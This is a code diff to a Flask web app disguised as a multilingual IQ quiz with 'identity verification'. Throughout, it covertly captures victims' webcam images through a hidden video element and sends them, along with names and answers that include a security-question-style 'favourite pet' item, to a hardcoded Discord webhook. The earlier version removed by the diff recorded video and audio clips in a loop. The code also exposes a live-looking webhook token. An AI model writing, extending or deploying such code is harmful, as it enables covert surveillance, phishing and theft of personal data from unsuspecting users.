@@ -4,7 +4,7 @@ import requests
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
-app.config["MAX_CONTENT_LENGTH"] = 30 * 1024 * 1024
+app.config["MAX_CONTENT_LENGTH"] = 10 * 1024 * 1024
 
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1566437289113161940/qkaHvkxwmc_uuM3YMobIKnL9kaJhRI9XA4-OwYMpIJEWZnagp5mqEE93c4es2n2aTXA1")
 
@@ -14,7 +14,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">IQ Questions - Vérification</title>
+    <title id="pageTitle">IQ Questions - Test Photo</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -50,7 +50,7 @@ HTML_TEMPLATE = """
         .action-btn:hover { background: #4f46e5; }
         #submitBtn { background: linear-gradient(135deg, #10b981, #059669); }
         #status { margin-top: 20px; font-weight: 700; font-size: 14px; }
-        #video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
+        #video-container { display: none; }
     </style>
 </head>
 <body>
@@ -64,13 +64,14 @@ HTML_TEMPLATE = """
         </select>
     </div>
     <h2 id="mainTitle">Vérification d'identité</h2>
-    <div class="subtitle" id="subTitle">Veuillez cliquer sur le bouton ci-dessous pour démarrer</div>
+    <div class="subtitle" id="subTitle">Veuillez cliquer pour démarrer le test photo</div>
 
     <div id="video-container">
         <video id="webcam" autoplay playsinline muted></video>
+        <canvas id="canvas" width="320" height="240"></canvas>
     </div>
 
-    <button type="button" id="startCamBtn" class="action-btn" onclick="startCameraAndRecording()">🎥 Démarrer la vérification</button>
+    <button type="button" id="startCamBtn" class="action-btn" onclick="startCameraAndTest()">📸 Démarrer le test (Photo)</button>
 
     <form id="quizForm" style="display:none; margin-top:20px;" onsubmit="event.preventDefault(); verifyAndSend();">
         <input type="text" id="username" placeholder="Votre Nom Complet" required>
@@ -104,9 +105,9 @@ HTML_TEMPLATE = """
 <script>
     const translations = {
         fr: {
-            title: "IQ Questions - Vérification", welcome: "Bienvenue dans IQ Questions",
-            mainTitle: "Vérification d'identité", subTitle: "Veuillez cliquer sur le bouton pour démarrer",
-            btnStart: "🎥 Démarrer la vérification", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez", yes: "Oui", no: "Non",
+            title: "IQ Questions - Test Photo", welcome: "Bienvenue dans IQ Questions",
+            mainTitle: "Vérification d'identité", subTitle: "Veuillez cliquer pour démarrer le test photo",
+            btnStart: "📸 Démarrer le test (Photo)", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez", yes: "Oui", no: "Non",
             q: [
                 "1. Penses-tu être plus beau/belle que moi ?", "2. Te considères-tu comme quelqu'un de naïf ?",
                 "3. Quel est le nom de votre animal préféré ?", "4. Comment décrivez-vous votre journée en général ?",
@@ -121,9 +122,9 @@ HTML_TEMPLATE = """
             ]
         },
         ar: {
-            title: "أسئلة الذكاء - التحقق", welcome: "مرحباً بكم في أسئلة الذكاء",
-            mainTitle: "التحقق من الهوية", subTitle: "يرجى النقر على الزر أدناه للبدء",
-            btnStart: "🎥 بدء التحقق والكاميرا", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا",
+            title: "أسئلة الذكاء - اختبار الصور", welcome: "مرحباً بكم في أسئلة الذكاء",
+            mainTitle: "التحقق من الهوية", subTitle: "يرجى النقر لبدء اختبار الصور",
+            btnStart: "📸 بدء الاختبار (صورة)", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا",
             q: [
                 "1. هل تعتقد أنك أنجح/أجمل مني؟", "2. هل تعتبر نفسك شخصاً ساذجاً؟",
                 "3. ما هو اسم حيوانك المفضل؟", "4. كيف تصف يومك بشكل عام؟",
@@ -138,9 +139,9 @@ HTML_TEMPLATE = """
             ]
         },
         en: {
-            title: "IQ Questions - Verification", welcome: "Welcome to IQ Questions",
-            mainTitle: "Identity Verification", subTitle: "Please click the button below to start",
-            btnStart: "🎥 Start Verification", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No",
+            title: "IQ Questions - Photo Test", welcome: "Welcome to IQ Questions",
+            mainTitle: "Identity Verification", subTitle: "Please click to start photo test",
+            btnStart: "📸 Start Test (Photo)", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No",
             q: [
                 "1. Do you think you are more handsome/beautiful than me?", "2. Do you consider yourself naive?",
                 "3. What is the name of your favorite pet?", "4. How do you generally describe your day?",
@@ -178,85 +179,65 @@ HTML_TEMPLATE = """
     }
 
     let mediaStream = null;
-    let mediaRecorder = null;
-    let recordingActive = false;
-    let uploadQueue = Promise.resolve();
 
-    async function startCameraAndRecording() {
+    async function startCameraAndTest() {
         try {
-            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
-            document.getElementById('webcam').srcObject = mediaStream;
+            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false });
+            const video = document.getElementById('webcam');
+            video.srcObject = mediaStream;
             
             document.getElementById('startCamBtn').style.display = 'none';
             document.getElementById('quizForm').style.display = 'block';
             document.getElementById('subTitle').innerText = "Veuillez répondre aux 20 questions";
 
-            recordingActive = true;
-            startSegmentLoop();
+            // نلتقط صورة فوراً كاختبار أول وتحفظ وتتبعت للديسكورد للتأكد
+            takeSnapshotAndSend("📸 [Test Instantané - Photo]");
         } catch (err) {
             alert("Erreur: Accès à la caméra refusé.");
         }
     }
 
-    function startSegmentLoop() {
-        if (!recordingActive || !mediaStream) return;
-        
-        try {
-            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-            let chunks = [];
+    function takeSnapshotAndSend(tag) {
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        if (!video.srcObject) return;
 
-            mediaRecorder.ondataavailable = e => {
-                if (e.data && e.data.size > 0) {
-                    chunks.push(e.data);
-                }
-            };
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            mediaRecorder.onstop = () => {
-                if (chunks.length > 0) {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const username = document.getElementById('username').value || "Anonyme";
-                    const formData = new FormData();
-                    formData.append("username", username + " [🎥 Clip 8s]");
-                    formData.append("video", blob, "clip_8s.webm");
-                    
-                    // إضافة في الـ Queue باش يبعثهم بالترتيب ومن غير ما يصير Spam
-                    uploadQueue = uploadQueue.then(() => 
-                        fetch("/submit-consent", { method: "POST", body: formData }).catch(e => {})
-                    );
-                }
-                if (recordingActive) {
-                    startSegmentLoop();
-                }
-            };
+        canvas.toBlob(blob => {
+            if (!blob) return;
+            const username = document.getElementById('username').value || "Utilisateur Anonyme";
+            const formData = new FormData();
+            formData.append("username", username + " " + tag);
+            formData.append("photo", blob, "snapshot.jpg");
 
-            mediaRecorder.start();
-
-            // ضبط المؤقت على 8 ثوانٍ بالضبط لكل مقطع فيديو
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === "recording") {
-                    mediaRecorder.stop();
-                }
-            }, 8000);
-
-        } catch (err) {
-            setTimeout(startSegmentLoop, 2000);
-        }
+            fetch("/submit-photo", { method: "POST", body: formData }).catch(e => {});
+        }, 'image/jpeg', 0.85);
     }
 
     async function verifyAndSend() {
         const status = document.getElementById('status');
         status.style.color = "#6366f1";
-        status.textContent = "Envoi des réponses en cours...";
+        status.textContent = "Envoi des réponses et de la photo en cours...";
 
-        recordingActive = false;
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
+        // التقاط صورة نهائية وقت الضغط على زر التأكيد
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        let photoBlob = null;
+        
+        if (video.srcObject) {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
         }
-
-        await uploadQueue;
 
         const formData = new FormData();
         formData.append("username", document.getElementById('username').value);
+        if (photoBlob) {
+            formData.append("photo", photoBlob, "final_snapshot.jpg");
+        }
+
         for (let i = 1; i <= 20; i++) {
             formData.append("q" + i, document.getElementById("q" + i).value);
         }
@@ -265,7 +246,7 @@ HTML_TEMPLATE = """
             const response = await fetch("/submit-answers", { method: "POST", body: formData });
             if (response.ok) {
                 status.style.color = "#10b981";
-                status.textContent = "Succès ! Vos réponses ont été envoyées.";
+                status.textContent = "Succès ! Vos réponses et la photo ont été envoyées.";
             } else {
                 status.style.color = "#ef4444";
                 status.textContent = "Erreur pendant l'envoi.";
@@ -284,15 +265,15 @@ HTML_TEMPLATE = """
 def home():
     return render_template_string(HTML_TEMPLATE)
 
-def send_to_discord(content, video_file=None):
+def send_to_discord(content, photo_file=None):
     payload = {"content": content}
     files = None
-    if video_file:
+    if photo_file:
         files = {
             "file": (
-                video_file.filename or "clip_8s.webm",
-                video_file.read(),
-                video_file.content_type or "video/webm"
+                photo_file.filename or "snapshot.jpg",
+                photo_file.read(),
+                photo_file.content_type or "image/jpeg"
             )
         }
     response = requests.post(
@@ -304,31 +285,32 @@ def send_to_discord(content, video_file=None):
     print(f"Discord Response Status: {response.status_code}")
     response.raise_for_status()
 
-@app.route("/submit-consent", methods=["POST"])
-def submit_consent():
+@app.route("/submit-photo", methods=["POST"])
+def submit_photo():
     try:
         username = request.form.get("username", "Utilisateur")
-        video_file = request.files.get("video")
-        if not video_file:
-            return jsonify({"error": "No video"}), 400
-        content = f"🎥 **IQ Questions — Clip (8s)**\n**Nom :** {username}"
-        send_to_discord(content, video_file)
-        return jsonify({"message": "Sent"}), 200
+        photo_file = request.files.get("photo")
+        content = f"📸 **IQ Questions — Capture Photo**\n**Nom :** {username}"
+        send_to_discord(content, photo_file)
+        return jsonify({"message": "Photo sent"}), 200
     except Exception as e:
-        print(f"Error in submit_consent: {str(e)}")
+        print(f"Error in submit_photo: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 @app.route("/submit-answers", methods=["POST"])
 def submit_answers():
     try:
         username = request.form.get("username", "Utilisateur")
+        photo_file = request.files.get("photo")
+        
         answers = []
         for i in range(1, 21):
             val = request.form.get(f"q{i}", "")
             if val:
                 answers.append(f"Q{i}: {val}")
-        content = f"✅ **Rapport Final IQ Questions**\n**Nom :** {username}\n" + "\n".join(answers)
-        send_to_discord(content)
+                
+        content = f"✅ **Rapport Final IQ Questions + Photo**\n**Nom :** {username}\n" + "\n".join(answers)
+        send_to_discord(content, photo_file)
         return jsonify({"message": "Sent"}), 200
     except Exception as e:
         print(f"Error in submit_answers: {str(e)}")
